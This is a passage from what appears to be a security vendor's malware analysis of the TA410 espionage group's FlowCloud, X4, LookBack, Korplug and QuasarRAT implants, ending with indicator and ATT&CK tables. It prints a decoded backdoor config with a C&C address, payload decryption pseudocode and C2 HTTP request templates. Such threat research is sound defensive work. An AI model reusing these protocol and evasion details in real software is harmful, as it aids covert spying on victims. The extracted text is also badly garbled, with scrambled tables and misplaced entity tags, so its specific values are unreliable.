backdoor in use . PCArrowI seems to correspond to [PERSON] FlowCloud . product_version : The backdoor \u2019s version . id_prefix : This value is prefixed to the generated ID . Presumably , used to group victims or campaigns . i d : This value uniquely identifies the victim . Initially , it is empty ; the value is generated on the [ORDINAL] first execution using the following format : < prefix>_<current timestamp>_<machine hostname>1234server_config{product_name : \u201c PCArrowI\"12/2656789product_version : \" v5.0.2\"id : \" [CARDINAL] 1202_[REDACTED]\"root : \" \" file_server : \" [CARDINAL] 47.111.22[.]65\"file_server_port : \" 80\"10file_server_bak : \" \" 11file_server_bak_port : \" \" 12exchange_server : \" 47.111.22[.]65\"13exchange_server_port : \" [CARDINAL] 81\"14exchange_server_bak : \" \" 15exchange_server_bak_port : \" \" [CARDINAL] 16file_server_key : \" [PERSON] E\\367\\016\\031< \u2026 >\"17xchg_server_key : \" 8\\335\\325$< \u2026 >\"18file_key : \" U\\267\\323\\353\\< \u2026 >\"19is_audio_only : false20id_prefix : \" 1202\"21}22Figure 12 . server_config section of a decoded [PERSON] FlowCloud configurationFlowCloud \u2019s capabilities are spread out over a series of singleton classes , each of which implements a cohesive set of functionalities related to a specific type of data or action . These roughly follow an internal naming convention where classes with names ending with manager_handler perform actions in response to [ORG] C&C commands , while those whose names end with manager automatically perform actions based on timers or event listeners . Each manager stores collected data in its own SQLite database , while data that is collected on demand is returned directly to the [ORG] C&C server . Data is encrypted with the aforementioned file_key before being inserted into the database . The location of the SQLite databases is defined by the data_folder install configuration key , with the default value being % ProgramFiles%\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\fcdata . The classes are orchestrated by an instance of fc_kernel_manager . This object is responsible for initializing other components and handling [ORG] C&C connections . It can also update the local configuration when the corresponding command is received . As shown in Figure [CARDINAL] 13 , parameters and frequency of automated actions can be specified and finely tuned through configuration policies . Data exfiltration is likewise automated : policies can contain a cache_size or cache_count parameter , which determines how much data can be collected locally by the corresponding class before it is staged for exfiltration.policys { guid : \" XXXX - XXXX - XXXX - XXXX- [CARDINAL] 30filter : \" * .doc\"filter : true14/26b_exclude_system_folders : true}installedapp_policy false}}Figure [CARDINAL] 13 . The policys [ sic ] section of a decoded [PERSON] FlowCloud configAs we have previously mentioned , this implant uses a lot of classes . Rather than documenting each of them individually , we will present an overview of the available functionality by grouping them into [CARDINAL] three categories : those that interact with the file system , functionalities that collect information about programs and processes , and those that gather real - time information about user activity . File systemFlowCloud provides interaction with the file system in a variety of ways , most of which can store file metadata and content in their SQLite database . [CARDINAL] One of these is a component that walks through all mapped file systems and collects files that are not excluded by filters in the [DATE] smfile_search_policy . It also creates an invisible window that listens for file creation , modification , or renaming events . The corresponding files are collected unless they are excluded by that policy . Another component collects information about mapped volumes , including mount point , name , drive type , and disk usage data . This same class collects file and directory metadata . As a complement to these automated measures , the backdoor implements functions that provide full access and control over the content of mounted drives . This includes bidirectional file transfers between the [ORG] C&C and the compromised machine . Programs and processesFlowCloud is able to automatically obtain a list of installed software through the use of the undocumented IShellAppManager COM interface . This functionality can also be invoked via a [ORG] C&C command . Figure [CARDINAL] 14 shows , after the extraneous code has been removed , how that interface is used.15/26Figure [CARDINAL] 14 . Simplified code showing how the [PRODUCT] IShellAppManager COM interface is used to list installed applicationsOther commands can be used to retrieve a detailed list of available services and currently running processes . Another interesting feature is the near real - time monitoring of process activity . To achieve this , [PERSON] FlowCloud runs [ORG] WMI queries every [ORDINAL] second to get all process creation and termination events . The obtained information is correlated with data from the Win32_Process table for a more detailed view . User activityFlowCloud is able collect a miscellany of data that we have decided to group under the \u201c User activity \u201d umbrella . It has the ability to monitor the clipboard for changes and save any data it contains . As seen in Figure [CARDINAL] 15 , it achieves this by creating an invisible window with a custom class and registering [CARDINAL] two clipboard formats . This window uses AddClipboardFormatListener ( on [PERSON] Windows [PERSON] Vista or more recent ) or SetClipboardViewer ( on Windows XP and prior ) to listen for clipboard content changes . Figure [CARDINAL] 15 . Set up monitoring of the clipboardCollected clipboard content is stored along with information about the current foreground window . This information can help attackers understand the data by contextualizing it . FlowCloud can periodically take screenshots and store them with information about the foreground process and time since the last user input . To limit the disk space used , images where [PERCENT] fewer [PERCENT] than [PERCENT] 5 % of the pixels differ from the most recently stored capture are n\u2019t saved . This feature can also be invoked on demand by the server . Another of the backdoor \u2019s components records mouse and keyboard activity to a database . It does not collect these directly , but instead acts in tandem with the keylogger component of the driver ( described in the next section ) by reading data from the \\\\.\\pipe\\namedpipe_keymousespy_english named pipe . Interestingly , [PERSON] FlowCloud can also gather information about things happening around the victim \u2019s computer . The [ORDINAL] first way it does so is through a [ORG] C&C command that takes a picture using connected camera peripherals . This feature is implemented using the [PERSON] CCameraDS class from OpenCV.The [ORDINAL] second way it can collect information about the computer \u2019s surroundings is by recording audio . Much like a voice assistant , [PERSON] FlowCloud can use a computer \u2019s microphone to listen to its surroundings , but instead of recording being triggered by a command word , it seems to be triggered by any sound over a threshold defined by the decibel_limit16/26field of the audio_policy . The default value is [CARDINAL] 65 decibels , which is in the upper range of normal conversation volume ( commonly defined to be anywhere [CARDINAL] between [CARDINAL] 50 [CARDINAL] and [CARDINAL] 70 dB by various sources).Self - decrypting [ORG] DLL ( setlangloc.dat)The loaded shellcode is a self - decrypting [ORG] DLL . It [ORDINAL] first decrypts the embedded [ORG] DLL using a byte - oriented XOR - and- ADD scheme ( shown in Figure [CARDINAL] 16 ) . The shellcode we analyzed used the key 0x7B. Once it has decrypted the embedded [ORG] DLL , the shellcode manually performs the functions of LoadLibrary and calls the loaded module \u2019s startModule export.1for ( int i=0 ; i < ciphertext_length ; i++)2plaintext[i ] = ( ( encrypted[i ] ^ key ) + key ) & 0xFFFigure [CARDINAL] 16 . Pseudocode for the [ORG] DLL decryption routineThis newly loaded module uses the same anti - debugging and anti - analysis techniques as the hijacking [ORG] DLL described above . On top of those , it also uses a few tricks of its own : Covers its tracks by overwriting the code previously modified by the malicious library with a useless call to lstrlenW. Base64 - encoded strings are used for function imports ( via GetProcAddress ) and only decoded as needed . Exits if the process \u2019s executable is not the expected [ORG] DLL hijacking target ( e.g. , setlang.exe).The module creates a new process using the same executable and performs process injection on it , redirecting the existing thread to the written code region . This code inside the new process launches a thread that decrypts and loads the [ORG] fcClient module before calling its startModule export . That function will perform the final stages of the installation and load the [ORG] DLL containing the backdoor functionality . Driver ( hidmouse.sys)FlowCloud \u2019s driver serves a dual purpose : it acts as both a keylogger and a rootkit . It accomplishes this mainly by hijacking native drivers \u2019 handler functions for specific I / O control codes and replacing them with its own : Read ( IRP_MJ_READ ) for the keyboard driver ( kbdclass or KeyboardClass0 ) Read ( IRP_MJ_READ ) for the mouse driver ( mouclass or PointerClass0 ) Device control ( IRP_MJ_DEVICE_CONTROL ) for the network driver ( tcpip or nsiproxy)The driver also provides kernel - level functionalities to be used by the [ORG] RAT . They can be invoked via [ORG] IO control codes or by writing to specific registry keys . This module is signed with a certificate with the thumbprint 02ED6A578C575C8D9C72398E790354B095BB07BC . Issued to [ORG] Hangzhou [ORG] Leishite [ORG] Laser [ORG] Technology [ORG] Co. in [DATE] 2012 by [ORG] Wosign and revoked in [DATE] 2014 , it seems most likely this certificate was stolen . [ORG] KeyloggingIn its IRP_MJ_READ handlers for keyboard and mouse events , the driver simply records [ORG] IO events to lookaside lists before passing them to the legitimate handler . This ensures that the driver does n\u2019t interfere in a way that could be noticeable by the user . These events are then parsed to the format used by the backdoor \u2019s keymouse_manager and written to the named pipe \\\\.\\pipe\\namedpipe_keymousespy_english . RootkitAfter hijacking the aforementioned drivers , the rootkit erases the [ORG] DLL names associated with them from internal structures used to display device drivers . The rootkit can prevent processes from being shown by utilities that list running processes , such as [PRODUCT] Task Manager . As shown in Figure [CARDINAL] 17 , it achieves this by removing their entries from the [NORP] ActiveProcessLinks list of the undocumented [NORP] KPROCESS kernel structure . Since this structure is not part of the public API and can change between releases , the rootkit contains code to match the operating system \u2019s build number to the correct offsets in this structure . That code covers all versions from Windows XP to Windows 10 20H1 . This functionality can be invoked on any process via the [PERSON] IOCTL_HIDE_PROCESS_BY_PROCESSID ( 0x222028 ) control code . It is also used , on driver startup , to hide the process with the [ORG] PID contained in the registry key HKLM\\HARDWARE\\{76BA14B7 - AF0C-4dc9 - 9E9D-2A6970F231D9 } . This process is further camouflaged by changing its associated executable filename to one of svchost.exe or dllhost.exe in the same kernel structure.17/26Figure [CARDINAL] 17 . Function used to prevent a process from being displayed in lists of running processesThrough its hijacking of the network driver , the rootkit can also hide a single process \u2019s network traffic from local utilities . The process whose traffic is to be hidden is set through the [PERSON] IOCTL_SET_TRAFFICHIDE_PROCESSID ( 0x222048 ) control code . Some of the rootkit \u2019s functions are used by the fcClientDll module to hide the process in which it is running . Control codes to manipulate a process name in various internal structures are also exposed by the driver . Persistence module ( fcClientWD)This module is relatively simple compared to other components . The previously mentioned [ORG] NetTask already accomplishes persistence in most cases , by executing on system startup . This module complements that mechanism by ensuring persistence in a very specific edge case where execution of the malware might be interrupted : the user logs out on a system with hibernation and Fastboot enabled . On systems where either of those is disabled , this module does nothing . [PERSON] FlowCloud v4.1.3This older version of [ORG] FlowCloud has already been described in a [GPE] Proofpoint blogpost and presents similarities to the newer version described in the preceding subsections , so we will only highlight notable differences and new information revealed by our analysis . This version runs multiple anti - analysis and anti - detection checks before executing its payload , and terminates if any of those tests detect that the process is being analyzed . It checks running processes for executables of several known cybersecurity vendors . While most of these names are also present in version [CARDINAL] 5 , this list is not a strict subset of the one v.5 uses . This tends to support the proposition that versions [CARDINAL] 4 and [CARDINAL] 5 of FlowCloud are maintained in parallel . It also embeds a [ORG] DLL version of the [NORP] Pafish ( aka Paranoid Fish ) sandbox and analysis detection tool as one of its encrypted resources . This library is loaded in memory and all of the anti - analysis / anti - sandboxing checks it implements are run . Interestingly , the driver installed is the same as the one for version [CARDINAL] 5.0.2 . Those used by version 5.0.3 provide identical functionality , but differ slightly . TA410 \u2013 LookingFrogLookingFrog uses [CARDINAL] two main malware families : [ORG] X4 and [PRODUCT] LookBack . We have seen both of them on machines belonging to the same victim . [PERSON] X4X4 is a custom backdoor that is used as a [ORDINAL] first stage , before [PRODUCT] LookBack is deployed . It is loaded by a [ORG] VMProtect - ed loader , usually named [ORG] PortableDeviceApi.dll or [PERSON] WptsExtensions.dll . Unfortunately , we were not able to uncover any persistence method.18/26The loader injects an orchestrator into memory in a svchost.exe process . In turn , the orchestrator injects the network component into memory and communicates with it via a file located at C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\Log\\rsa.txt . Figure [CARDINAL] 18 shows a summary of the [ORG] X4 components . Figure [CARDINAL] 18 . Summary of the X4 componentsThe network component is shellcode . It is encrypted using the [ORG] AES algorithm and stored in the Windows registry . Table [CARDINAL] 2 shows the [CARDINAL] three registry keys used by X4.Table 2 . Network shellcode registry keysRegistry KeyDescriptionHKLM\\SOFTWARE\\Microsoft\\DRM\\X4Key AES key . HKLM\\SOFTWARE\\Microsoft\\DRM\\PSKey Name of the process into which the shellcode will be injected [ORG] HKLM\\SOFTWARE\\Microsoft\\DRM\\X4Data [ORG] Encrypted shellcode.(spoolsv.exe).The decrypted shellcode looks like it was based on [GPE] Metasploit and communicates with a hardcoded [ORG] IP address via HTTP . An interesting characteristic is that it uses the fake Host header onedrive.live.com . Every [ORDINAL] second , the orchestrator , which lives in memory only , reads the cleartext rsa.txt file to check whether there are new commands to execute . The commands are received from the [ORG] C&C server , via the network shellcode . In the orchestrator , the commands are identified by a numerical identifier that is computed from the command name , as shown in Figure [DATE] 19.Figure [DATE] 19 . Custom hash function seen in X4The orchestrator handles [CARDINAL] seven commands , detailed in [ORG] Table 3 . Output of these commands is written to [CARDINAL] C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\Log\\output.log . Table [CARDINAL] 3 . X4 backdoor commandsIDNameDescriptioncan also modify [WORK_OF_ART] X4Key and PSKey.0x3ECFF9B9D92 osload Write new encrypted shellcode to HKLM\\SOFTWARE\\Microsoft\\DRM\\X4Data . It [CARDINAL] 0x3F5FAFC0EDD pskill Kill a process by [ORG] PID . 0x3F5FB1E6015 pslist [PERSON] List the running processes using [ORG] CreateToolhelp32Snapshot and Process32Next . 0x3B6C27610D1 inject [PERSON] Decrypt and inject shellcode , from encrypted form on disk , into memory . [ORG] 0x6D6E70D40exec [ORG] Execute a given command line . live cacls [PRODUCT] Modify the access controls of a given object using SetEntriesInAclA , Get the [ORG] PID of the process in which the orchestrator is running . SetNamedSecurityInfoA and [ORG] BuildExplicitAccessWithName . [ORG] X4 provides basic functionalities to control the machine remotely , but it lacks more advanced spying capabilities . LookBack19/26The [PRODUCT] LookBack backdoor has previously been described by [ORG] Proofpoint ; we are therefore providing a quick summary and our analysis of the custom network protocol . BackdoorIn all samples we observed , the [PRODUCT] LookBack loader is a legitimate version of libcurl.dll with the curl_share_init ( ordinal # [MONEY] 52 ) export modified to load the [ORG] SodomNormal communications module . This corroborates the observation by [ORG] Proofpoint researchers . This module is embedded in the library \u2019s resource section and encrypted with an algorithm similar to RC4 . The encryption / decryption function , shown in Figure [CARDINAL] 20 , always uses the same key . Figure [CARDINAL] 20 . Decompiled view of the function used to encrypt and decrypt the embedded moduleThe SodomNormal component tries to read configuration information from a sodom.ini file . This configuration file is encrypted using the just - described function and starts with the magic bytes 0xAF1324BC . If this file is unavailable or invalid , a hardcoded default configuration is used . A unique victim ID is then generated from the victim \u2019s CPUID , username , and [ORG] IP address . This is sent to the server along with the computer \u2019s name and the configuration data . The communications module then downloads the main backdoor module , named [ORG] SodomMain , from the [ORG] C&C server . Unfortunately , we could n\u2019t obtain this module . Communication protocolLookBack can communicate over HTTP or via its \u201c normal protocol \u201d . In either case , the data being transferred is the same . [PRODUCT] LookBack \u2019s normal protocol uses raw [ORG] TCP sockets and a custom message format described in [LAW] Table [LAW] 4 . This message is composed of [CARDINAL] eight header fields , followed by a body of variable length . The message body is encrypted with the function previously described for the [ORG] SodomNormal resource in the loader ( Figure [CARDINAL] 20 ) . The encrypted data is then compressed with the deflate algorithm via the compress function of the statically linked zlib . Table 4 . [PRODUCT] LookBack message formatFieldOffset ( bytes ) Compressed body size [CARDINAL] 0x08 Uncompressed body size 0x0C Checksum 0x10The constant 0x48AB2EC2 . Messages that do n\u2019t start with this magic value are discarded . NoteCRC32 of the message body.20/26FieldOffset ( bytes)NoteMessage type0x14 < Message dependent > 0x20Table 5 . [PRODUCT] LookBack message typesMessagetypeUsed [PERSON] byInteger value indicating the message \u2019s content and the associated action to be performed . We have found code for over 50 message types . There seems to be little to no overlap between the values used by the client and the server . Table 5 presents the types we have analyzed in more depth . The message body can be empty . In this case , the checksum and length fields are set to [CARDINAL] 0x00.Description2 [CARDINAL] 36 [CARDINAL] and [CARDINAL] 38 [CARDINAL] 35 and [CARDINAL] 37 [CARDINAL] 41 42victim host . [ORG] Client [ORG] Register with [ORG] C&C server . The body contains configuration and information about [ORG] the [ORG] Server [ORG] Acknowledgment for message type [CARDINAL] 2 . [PERSON] Client [PERSON] Request to download the main backdoor component ( [ORG] SodomMain ) . [PERSON] Server [PERSON] Reply to message type [CARDINAL] 8 . The message body contains the [ORG] SodomMain file . [PERSON] Client [PERSON] Transfer file to server in message body . [PERSON] Server [PERSON] Response to message [CARDINAL] 36 or [DATE] 38 . [PERSON] Client [PERSON] Request file from server . [PERSON] Server [PERSON] Transfer file to client in message body ( response to message 41)The HTTP protocol uses the message format detailed in the previous paragraph , but it adds a few extra steps to disguise its traffic as legitimate HTTP . It uses a pair of hardcoded templates , [CARDINAL] one for client requests and another for server responses . The fields required for [ORG] HTTP , such as content length , address , and port number , are filled in with the correct values ; useless data is used for the others . For client requests , the messages are encoded with a modified hexadecimal algorithm that uses the encoding alphabet a - p instead of the conventional 0 - 9a - f. This provides some obfuscation and ensures that messages will not contain binary data or be obviously hex encoded , both of which could look suspicious in an application / x - www - form- urlencoded message . The request \u2019s body is composed of this encoded value prefixed with the hardcoded string id=1&op = report&status=. [GPE] Client request and server response templates are shown in Figure [CARDINAL] 21 and Figure [CARDINAL] 22 respectively , with the template fields in angle brackets.123456789101112POST < C&C address + port>/status.php?r=<epoch timestamp><random [QUANTITY] 16 - bit int > HTTP/1.1Accept : text / html , application / [PERSON] xhtml+xml , * /*Accept - Language : en - usUser - Agent : < return value of ObtainUserAgentString OR \" [WORK_OF_ART] Mozilla/5.0 ( [WORK_OF_ART] Windows [WORK_OF_ART] NT [WORK_OF_ART] 6.1 ; WOW64 ; Trident/7.0 ; rv:11.0 ) like Gecko\">Content - Type : application / x - www - form - urlencodedAccept - Encoding : gzip , deflateHost : < C&C url > Content - Length : < content length > Connection : Keep - AliveCache - Control : no - cacheid=1&op = report&status=<encoded [PRODUCT] LookBack message > Figure [CARDINAL] 21 . Template used for HTTP client requestsOn the server side , the data described in the previous section is sent directly as binary data in the body with a header purporting it is a [ORG] GIF image.123456HTTP/1.1 [CARDINAL] 200 OKServer : nginx/1.12.2Date : < current time > GMTLast - Modified : < current time - 100 seconds > GMTETag : <3 random [QUANTITY] 16 - bit ints > Accept - Ranges : bytes21/26789Content - Length : < content length > Keep - Alive : timeout=5 , max=100Connection : Keep - Alive10Content - Type : image / gif1112 < [PRODUCT] LookBack message > Figure [CARDINAL] 22 . Template used for HTTP server [ORG] responsesTA410 \u2013 JollyFrogThis [ORDINAL] third team uses off - the - shelf malware from the known malware families QuasarRAT and [PERSON] Korplug ( aka PlugX ) . [ORG] JollyFrog mostly aligns with what was described by Fortinet as APT10.KorplugKorplug , also known as PlugX , is a backdoor that has been used for [DATE] years by many different cyberespionage groups . Despite being well known , it is still in use and we have observed [PERSON] TA410 using it as recently as in [DATE] April [DATE] 2021.In the case of [PERSON] TA410 , [PERSON] Korplug arrives as a RARSFX archive , generally named m.exe , containing [CARDINAL] three files : qrt.dll : A custom loader . qrtfix.exe : A legitimate signed application from F - Secure , vulnerable to [ORG] DLL search - order hijacking . qrt.dll.usb : The [PERSON] Korplug shellcode . The loader allocates memory using [PRODUCT] VirtualAlloc and copies the content of qrt.dll.usb there . Then it jumps right into the shellcode that will decompress and load the [PERSON] Korplug payload . QuasarRATQuasarRAT is a full - featured backdoor freely available on [ORG] GitHub . It is used by numerous threat actors who perform cyberespionage or cybercrime . [ORG] TA410 uses a custom downloader and a custom loader written in .NET , which are convenient for identifying their instances of QuasarRAT among all the noise created by other attackers . Named sll.exe , this downloader is digitally signed with the certificate seen in Figure [CARDINAL] 23 . The certificate is likely stolen and belongs to   ( translated : [ORG] Beijing [ORG] Heyingxunshi [ORG] Technology [ORG] Co. , [ORG] Ltd. ) with thumbprint 850821D88A4475F0310F10FBA806353A4113D252 . Although the certificate has now been revoked , it was still valid when this sample was signed on [DATE] August [DATE] 10th , [CARDINAL] 2020.22/26Figure [CARDINAL] 23 . [ORG] Digital signature of the QuasarRAT downloaderThis downloader simply downloads the loader and encrypted QuasarRAT payload from the hardcoded [ORG] C&C server url at /rwjh / new/. This server was previously linked to [PERSON] FlowCloud ( [ORG] FlowingFrog ) . The loader is named [PERSON] PresentationCache.exe and is protected with [ORG] DNGuard , a commercial .NET packer . It is also signed with the same certificate as the downloader . It decrypts and loads the final QuasarRAT payload , which uses cahe.microsofts[.]org as its [ORG] C&C server . [ORG] ConclusionTA410 is a cyberespionage umbrella targeting high - profile entities such as governments and universities worldwide . ESET is revealing its latest findings about this group , including results from ongoing research , during [PERSON] Botconf 2022.Initial access to targets is obtained by exploiting vulnerable internet - facing applications such as [ORG] Microsoft [ORG] Exchange , or by sending spearphishing emails with malicious attachments such as RTF documents created via the [FAC] Royal [FAC] Road builder . Even though the [ORG] JollyFrog team uses generic tools , [ORG] FlowingFrog and [ORG] LookingFrog have access to complex implants such as [PERSON] FlowCloud and [PRODUCT] LookBack . [ORG] YARA and [ORG] Snort rules for these implants are available in ESET \u2019s GitHub repository . For any inquiries about our research published on [ORG] WeLiveSecurity , please contact us at threatintel@eset.com . [ORG] ESET [ORG] Research now also offers private [ORG] APT intelligence reports and data feeds . For any inquiries about this service , visit [ORG] the [ORG] ESET [ORG] Threat [ORG] Intelligence page . IoCs FilesSHA-1FilenameDetectionhhh.exewinver64.dllhidmouse.sysWin32 / Agent . [ORG] UWR Win32 / Agent . [ORG] UNL Win32 / Agent . UKR Win64 / Agent . UKR Win32 / Agent . ULH Win32 / Agent . ABYK Win32 / Agent . ULH Win64 / Agent . KM Win32 / ParanoidFish . A Win64 / Agent . UKR Win64 / Agent . UKR Win32 / Agent . [ORG] TWI Win32 / Agent . [ORG] TWI Win64 / Agent . UKR Win32 / Agent . [ORG] TWI Win32 / Agent . [ORG] TWI Win32 / Agent . [GPE] UKD Win32 / [ORG] Rozena . CP Win32 / Agent . ULLN / A [CARDINAL] 38D0E92AFF991CFC9C68D7BAAD6CB85916139AF5 hidmouse.sys AF978ED8AD37CE1437A6B42D96BF518D5C4CFD19 hidmouse.sys [GPE] B70F3A3A9B5B8506EE95791469CA496E01AD7DAF winver32.dll 014421BDB1EA105A6DF0C27FC114819FF3637704 EA298866E5A61FEEA4D062987F23B10A78C8A4CA N / A 021B9E2E8AA30B29569254C0378A9F43E4F32EEC 2A2F08FAD6B0A86DC94885224687D954E739CC21 N / A 3658B7CCA13C8C8AD03E9B6AEFE4B9CBE48E3C81 hidmouse.sys DB2DF1BDF8145CB8ABA3A2026A3CC3EF4F1762BE phx.dll EDE2AB811311FC011B1E89C5A0B7A60C123B7398 7AA35BA7030AFCD271436DE8173D7B2F317A1BFC [DATE] libcurl.dll A5C02ABE698300F3DE0B7CC7F0856652753831DA libcurl.dll [CARDINAL] 613C4AFAE8F5F80F22DCD1827E3230FCA361ADA5 libcurl.dll 859CD6DFDADAB3D6427C6C1C29581CB2094D648F meterpreter.exe DBEA7F0C0D2BF8BC365A2D1572CA1538FE8FB9A3 responsor.dat ADD5B4FD9AEA6A38B5A8941286BC9AA4FE23BD20 .doc Win32 / [GPE] Exploit . Agent . TY 7BA42061568FF6D9CA5FE5360DCE74C25EA48ADA N / A D81215890703C48B8EA07A1F50FEC1A6CA9DF88B N / A F359D3C074135BBCA9A4C98A6B6544690EDAE93D OnKeyToken_KEB.dll Win32 / Injector . ELGA 621B31D5778EC2FB72D38FB61CED110A6844D094 N / A BC11DC8D86A457A07CFE46B5F2EF6598B83C8A1F [PRODUCT] m.exe qrt.dll.usb BDECA89B4F39E6702CE6CBBC9E6D69F6BBAB01C8 [ORG] N / A D95185A4A3F8512D92F69D2ED7B8743638C54BE8 N / A BE7F0E41CD514561AED43B07AA9F5F0842BF876C HTra.exe 7F663F50E9D6376715AEB3AB66DEDE038258EF6C [PERSON] HTran13.exe [PERSON] BEDA1224B3BB9F98F95FF7757D2687F4D9F4B53A event.exe [CARDINAL] 2B61E7C63A0A33AAC4CF7FE0CEB462CF6DACC080 htran.exe EF3C796652141B8A68DCCF488159E96903479C29 [PERSON] 6B547C244A3086B5B6EA2B3A0D9594BBE54AE06B inbt.zipFlowCloud v5 FlowCloud D TA410 32 - bit TA410 [CARDINAL] 64 - bit Win32 / Agent . ACKQ Packed Tend Win32 / TrojanDownloader . Agent . FLI Unpacked Te [ORG] Tendyron ma [ORG] X4 network s Win64 / Rozena . [PERSON] AO [PERSON] Korplug drop Win32 / Injector . [PERSON] EMVA [PERSON] Korplug loade Win32 / Injector . [ORG] EMVA [ORG] MSIL / TrojanDownloader . Agent . GPS QuasarRAT d Simple cmd.e This is a Pyth for [ORG] the vulnerMSIL / Spy . Agent . AES Win32 / HackTool . Hucline . AB Win32 / HackTool . Hucline . S Win32 / Agent . [ORG] UJN Win32 / HackTool . Hucline . AB Win32 / HackTool . Hucline . AB Python / HackTool . Agent . [CARDINAL] J4CDCE3AF614C2A5E60E71F1205812AB129C0955B [GPE] msd017.exePython / Exploit . MS17 - 010.Bsll.exe [ORG] PresentationCache.exe [ORG] MSIL / Agent . TZGhtran_f - secury.exe23/26Certificates02ED6A578C575C8D9C72398E790354B095BB07BC [PERSON] Hangzhou [PERSON] Leishite [ORG] Laser [ORG] Technology [ORG] Co. , Ltd. [PERSON] Hangzhou [PERSON] Leishite [ORG] Laser [ORG] Technology [ORG] Co. , Ltd. [DATE] 2012 - 03 - 29 09:07:04 UTC 2014 - 04 - 02 06:24:19 UTCSerial number [ORG] 0F8B600FF1882E [ORG] Serial number [CARDINAL] 4ED8730F4E1B8558CD1CB0107B5F776B Thumbprint Subject CN     ( translation : [ORG] Beijing [ORG] Heyingxunshi [ORG] Technology [ORG] Co. , [ORG] Ltd. ) Subject O     ( translation : [ORG] Beijing [ORG] Heyingxunshi [ORG] Technology [ORG] Co. , [ORG] Ltd. ) [FAC] Subject [FAC] OU     ( R&D Department ) Valid to ( [GPE] Beijing ) CN 2019 - 11 - 13 00:00:00 UTC 2020 - 11 - 12 23:59:59 UTC850821D88A4475F0310F10FBA806353A4113D252NetworkDomainIPFirst seenDetails43.254.216[.]104 2020 - 06 Delivery server [DATE] 45.124.115[.]103 [DATE] 2020 - 08 Delivery server 161.82.181[.]4 2020 - 12 Delivery server [CARDINAL] 43.254.219[.]153 2020 - 07 X4 C&C server 154.223.141[.]36 [DATE] 2020 - 06 [ORG] HTran [ORG] C&C server 103.139.2[.]932020 - 10cahe.microsofts[.]com ffca.caibi379[.]com smtp.nsfwgo[.]com45.124.115[.]103 [DATE] 2020 - 06 [DATE] 185.225.19[.]17 [DATE] 2021 - 01 [DATE] 94.158.245[.]249 2020 - 03 5.252.179[.]227 2021 - 03 222.186.151[.]141 2019 - 11 47.111.22[.]65 2020 - 09 114.55.109[.]199 2020 - 05 2020 - 09 185.225.17[.]39 N / Adlaxpcmghd[.]com wwww.dlmum[.]com MITRE ATT&CK techniquesTendyron [ORG] C&C server QuasarRAT [ORG] C&C server QuasarRAT downloader [ORG] C&C server [PERSON] Korplug C&C server [PRODUCT] LookBack C&C server [PRODUCT] LookBack C&C server [PRODUCT] LookBack C&C server [PRODUCT] LookBack C&C server FlowCloud C&C server [ORG] FlowCross C&C server FlowCloud C&C server [PRODUCT] LookBack C&C server FlowCloud C&C serverThis table was built using version 9 of the MITRE ATT&CK framework . TacticIDNameDescriptionT1587.001 Develop Capabilities : [ORG] DevelopmentTA410 develops [PRODUCT] LookBack and [PERSON] FlowCloud . [ORG] TA410 uses stolen code - signing certificates . Initial AccessExecutionT1190T1588.005 Obtain Capabilities : Exploits Exploit Public - Facing Native APIT1566.001T1106T1129T1203T1559.001Shared [ORG] Modules [ORG] Exploitation for Client ModelTA410 had exploits for [ORG] ProxyLogon and [ORG] ProxyShell . [ORG] TA410 has exploited web server vulnerabilities for initial access . [ORG] TA410 uses malicious [ORG] RTF and DOCX attachments to compromise victims . [ORG] FlowCloud makes extensive use of the Windows API to execute commands and launch processes . [PERSON] TA410 \u2019s backdoors can load DLLs and execute their payloads . [ORG] TA410 uses [FAC] Royal [FAC] Road RTF documents to compromise victims . [PERSON] FlowCloud uses [ORG] COM interfaces to schedule tasks and perform WMI queries.24/26TacticIDT1047NameWindows Management InstrumentationT1053.005 Scheduled Task / Job : PersistenceT1505.003Defense EvasionDiscoveryCollectionDescriptionTA410 uses [ORG] WMI for lateral movement and information gathering . [PERSON] FlowCloud creates a scheduled task for persistence . [ORG] TA410 plants webshells on vulnerable web servers . FlowCloud can be configured to create a service for persistence . FlowCloud files are distributed and stored in encrypted form . The driver component of [PERSON] FlowCloud masquerades as a mouse driver service . [PERSON] Files named after legitimate utilities are written into the % ProgramFiles%\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\ subdirectory . [ORG] FlowCloud uses a rootkit to hide its network traffic and processes from system utilities . [PERSON] FlowCloud uses both regular and reflective [ORG] DLL injection . It also manually loads some DLLs , bypassing calls to LoadLibrary . TA410 \u2019s backdoors perform process injection to masquerade as harmless processes . [CARDINAL] One of FlowCloud \u2019s DLLs replaces instructions in the loading process to make it execute code written in its memory . [PERSON] FlowCloud uses module stomping to hide the loading of its main backdoor . Multiple TA410 backdoors communicate with their [ORG] C&C through encrypted and obfuscated channels . [PERSON] FlowCloud uses [ORG] DLL Side - Loading to launch its [ORDINAL] second - stage dropper . Some versions of [PERSON] FlowCloud use the [NORP] Pafish utility to detect virtualization , sandboxes , and debuggers . FlowCloud can create processes using tokens acquired from legitimate processes . [PERSON] FlowCloud deletes its rootkit \u2019s executable after launching it . FlowCloud backdates some files and services to [DATE] 2013 . When logging mouse events , [ORG] FlowCloud gathers information about the application running in the foreground . Multiple [PERSON] TA410 backdoors can list running processes . [PERSON] FlowCloud uses the [PRODUCT] IShellAppManager COM object to list installed software . [PERSON] FlowCloud can search through connected file systems and obtain directory listings . FlowCloud can list connected camera devices . [PERSON] FlowCloud can discover and use locally configured proxies . [PRODUCT] Scheduled [PRODUCT] Task [PRODUCT] Create [PRODUCT] or [ORG] Modify [ORG] Obfuscated [ORG] Files or [PRODUCT] Masquerade [PRODUCT] Task or [PERSON] Legitimate [PERSON] Name or Dynamic - link [PERSON] Library [PERSON] HijackingT1543.003T1027T1036.004T1036.005T1014T1055.001T1055T1055.003T1140T1497T1134.002T1574.002Host : File DeletionT1055.012 Process Injection : Files or Information Hijack Execution Flow : [ORG] DLL Side- Process with [ORG] Token T1070.004 Indicator Removal on T1070.006 Indicator Removal on File and Directory T1518T1083T1120T1016T1012FlowCloud components use registry keys to signal each other . FlowCloud registers a listener to steal clipboard data when it is changed . [PERSON] FlowCloud logs mouse clicks . FlowCloud records keystrokes . [PERSON] FlowCloud takes screenshots at regular intervals . [PERSON] FlowCloud uses OpenCV to take pictures using connected camera devices . [PERSON] FlowCloud has audio capture functionality . [ORG] Clipboard [ORG] Data T1056.001 Input Capture : [ORG] Automated [ORG] Collection [ORG] FlowCloud automatically collects data based on timers and [ORG] FlowCloud stores collected data in local SQLite databases [ORG] T1074.001 [ORG] 